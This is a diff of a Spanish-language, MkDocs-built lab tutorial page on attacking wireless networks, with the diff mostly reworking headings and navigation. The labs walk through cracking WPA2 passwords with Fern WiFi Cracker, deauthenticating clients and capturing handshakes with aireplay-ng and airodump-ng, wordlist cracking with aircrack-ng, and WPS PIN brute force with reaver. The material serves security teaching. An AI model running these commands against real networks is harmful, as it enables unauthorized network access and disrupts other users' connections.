@@ -65,6 +65,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#laboratorio-1-fern-wifi-cracker" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -883,11 +888,11 @@
   
   
     <li class="md-nav__item">
-      <a href="../metasploitableVM-setup/" class="md-nav__link">
+      <a href="../metasploitableVM/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    Metasploitable VM Setup
+    Metasploitable VM
     
   </span>
   
@@ -905,11 +910,11 @@
   
   
     <li class="md-nav__item">
-      <a href="../nikto-metasploitable/" class="md-nav__link">
+      <a href="../nikto/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
-    Nikto en Metasploitable VM
+    Nikto (UNDER CONSTRUCTION)
     
   </span>
   
@@ -978,6 +983,18 @@
       
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Ataque a Redes Inalambricas
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -988,6 +1005,59 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#laboratorio-1-fern-wifi-cracker" class="md-nav__link">
+    <span class="md-ellipsis">
+      LABORATORIO 1 (FERN WIFI CRACKER)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#laboratorio-2-fuerza-bruta" class="md-nav__link">
+    <span class="md-ellipsis">
+      LABORATORIO 2 (FUERZA BRUTA)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#laboratorio-3-wps-crack" class="md-nav__link">
+    <span class="md-ellipsis">
+      LABORATORIO 3 (WPS CRACK)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#configuraciones-finales-extra" class="md-nav__link">
+    <span class="md-ellipsis">
+      CONFIGURACIONES FINALES EXTRA
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -1063,6 +1133,50 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#laboratorio-1-fern-wifi-cracker" class="md-nav__link">
+    <span class="md-ellipsis">
+      LABORATORIO 1 (FERN WIFI CRACKER)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#laboratorio-2-fuerza-bruta" class="md-nav__link">
+    <span class="md-ellipsis">
+      LABORATORIO 2 (FUERZA BRUTA)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#laboratorio-3-wps-crack" class="md-nav__link">
+    <span class="md-ellipsis">
+      LABORATORIO 3 (WPS CRACK)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#configuraciones-finales-extra" class="md-nav__link">
+    <span class="md-ellipsis">
+      CONFIGURACIONES FINALES EXTRA
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -1079,7 +1193,7 @@
 
   <h1>Ataque a Redes Inalambricas</h1>
 
-<p>EJERCICIO (FERN WIFI CRACKER)</p>
+<h2 id="laboratorio-1-fern-wifi-cracker">LABORATORIO 1 (FERN WIFI CRACKER)</h2>
 <ol>
 <li>Abrimos <strong>Fern WIFI Cracker</strong> en Kali</li>
 <li>Seleccionamos la interfaz WLAN0 o tarjeta inalámbrica de la maquina</li>
@@ -1088,57 +1202,49 @@
 <li>Se selecciona la red y en <strong>Attack</strong></li>
 <li>Finalmente obtendremos la contraseña en la parte inferior</li>
 </ol>
-<p>EJERCICIO (FUERZA BRUTA)</p>
+<h2 id="laboratorio-2-fuerza-bruta">LABORATORIO 2 (FUERZA BRUTA)</h2>
 <ol>
 <li>En la terminal Kali ejecutamos <strong>airmon-ng</strong> para ver nuestra interfaz de tarjeta</li>
-<li>Ahora pondremos nuestra tarjeta en modo monitoreo:</li>
-</ol>
-<p><strong>airmon-ng start &lt;Interface&gt;</strong></p>
-<ol>
+<li>Ahora pondremos nuestra tarjeta en modo monitoreo:<br />
+<strong>airmon-ng start &lt;Interface&gt;</strong></li>
 <li>Es probable que nos dé un error debido a más procesos que interfieren por lo que tendremos que terminarlos con <strong>kill &lt;PID&gt;</strong> (ID DEL PROCESO)</li>
 <li>Comenzaremos el monitoreo: <strong>airodump-ng wlan0mon</strong> (nuestra interfaz)</li>
-<li>Ahora monitorearemos la red especifica: airodump-ng -w &lt;nombre Archivo&gt; -c &lt;CH de la red&gt; --bssid &lt;BSSID de la red&gt; wlan0mon</li>
-</ol>
-<p><strong>airodump-ng -w attack1 -c 3 --bssid 5C:E9:31:01:36:DF wlan0mon</strong></p>
-<ol>
+<li>Ahora monitorearemos la red especifica: airodump-ng -w &lt;nombre Archivo&gt; -c &lt;CH de la red&gt; --bssid &lt;BSSID de la red&gt; wlan0mon<br />
+<strong>airodump-ng -w attack1 -c 3 --bssid 5C:E9:31:01:36:DF wlan0mon</strong></li>
 <li>Ahora ocupamos un <strong>Handshake</strong> de la red por lo que en otra terminal ejecutaremos: aireplay-ng -0 &lt;paquetesAEnviar&gt; -a &lt;BSSID&gt; -c &lt;STATION&gt; wlan0mon<br />
 <strong>aireplay-ng -0 10 -a 5C:E9:31:01:36:DF -c D8:1F:12:B4:41:A9 wlan0mon</strong></li>
 <li>Y ahora en la anterior terminal deberíamos tener el HANDSHAKE en la parte superior derecha. EJEMPLO:
 <img alt="RESULTADO DEL HANDSHAKE CORRECTO" src="../../assets/image55.png" /></li>
 <li>Y ahora podemos detener este monitoreo y cerrar la otra terminal</li>
-<li>Y ahora intentaremos entrar en la red: aircrack-ng -w &lt;ubicacionListaPalabras&gt; -b &lt;SSID&gt; &lt;archivoCapCreadoDelMonitoreoAnterior&gt;</li>
-</ol>
-<p><strong>aircrack-ng -w /Desktop/wordlist.txt -b 5C:E9:31:01:36:DF /home/rusian/attack1.cap</strong></p>
-<ol>
+<li>Y ahora intentaremos entrar en la red: aircrack-ng -w &lt;ubicacionListaPalabras&gt; -b &lt;SSID&gt; &lt;archivoCapCreadoDelMonitoreoAnterior&gt;<br />
+<strong>aircrack-ng -w /Desktop/wordlist.txt -b 5C:E9:31:01:36:DF /home/rusian/attack1.cap</strong></li>
 <li>Comenzará a probar todas las combinaciones de la lista de palabras (wordlist.txt) para encontrar la correcta de la red.</li>
 </ol>
 <p>EXTRA</p>
 <p>Las redes WPA2 son muy fuertes y no se pueden violar simplemente por ensayo y error como en la WEP por lo que es necesario tener una lista de palabras y dependiendo si esta lista es fuerte podrá ser posible descifrar mejor esta red mientras que si es débil esta lista no será posible por lo que en este caso usamos un ataque de fuerza bruta el cual evalúa todas las palabras de la lista que conseguí para descifrar la contraseña.</p>
 <p>El archivo CAP por defecto debería guardarse en nuestra carpeta Home y se crea con el nombre que nosotros antes le asignamos, y aunque al hacer el monitoreo se crean más tipos de archivos con el mismo nombre solo será necesario utilizar en este caso el (.cap)</p>
 <p>Este método para estas redes suele ser tardado y no muy fiable de éxito</p>
-<p>EJERCICIO</p>
+<h2 id="laboratorio-3-wps-crack">LABORATORIO 3 (WPS CRACK)</h2>
 <ol>
 <li>Con el comando <strong><em>wash</em></strong> y <strong><em>reaver</em></strong> en la terminal se nos mostraran varias opciones a usar</li>
-<li>Abrimos el modo monitoreo de nuestra tarjeta de red:</li>
-</ol>
-<p><strong><em>wash -i wlan0mon</em></strong></p>
-<ol>
-<li>Y para comenzar simplemente ejecutamos:</li>
-</ol>
-<p><strong><em>reaver -i wlan0mon -b &lt;BSSID&gt; -vv</em></strong></p>
-<ol>
+<li>Abrimos el modo monitoreo de nuestra tarjeta de red:<br />
+<strong><em>wash -i wlan0mon</em></strong></li>
+<li>Y para comenzar simplemente ejecutamos:<br />
+<strong><em>reaver -i wlan0mon -b &lt;BSSID&gt; -vv</em></strong></li>
 <li>Y al final podremos obtener el pin WPS</li>
 </ol>
 <p>Este método puede durar bastante, ya sea un par de horas o incluso días, pero se nos podrá mostrar el pin WPS y la contraseña WPA2 para podernos conectar a la red, pero si el usuario cambio la contraseña de la red solo debemos cambiar la opción -vv por -p &lt;pinDe8Digitos&gt; el cual ya obtuvimos antes con el escaneo anterior y obtendremos la contraseña WPA2 de nuevo en cuestión de segundos.</p>
 <p><strong><em>reaver -i wlan0mon -b &lt;BSSID&gt; -p &lt;pin&gt;</em></strong></p>
-<p>EXTRA</p>
+<h2 id="configuraciones-finales-extra">CONFIGURACIONES FINALES EXTRA</h2>
 <p>Para regresar nuestra tarjeta de red al modo normal hay dos formas:</p>
 <ul>
 <li>Reiniciando la maquina</li>
-<li>Reiniciando los servicios por Terminal</li>
+<li>Reiniciando los servicios por Terminal<ul>
 <li><strong>airmon-ng stop wlan0mon</strong></li>
 <li><strong>ifconfig wlan0 up</strong></li>
 <li><strong>service NetworkManager restart</strong></li>
+</ul>
+</li>
 </ul>
 
 
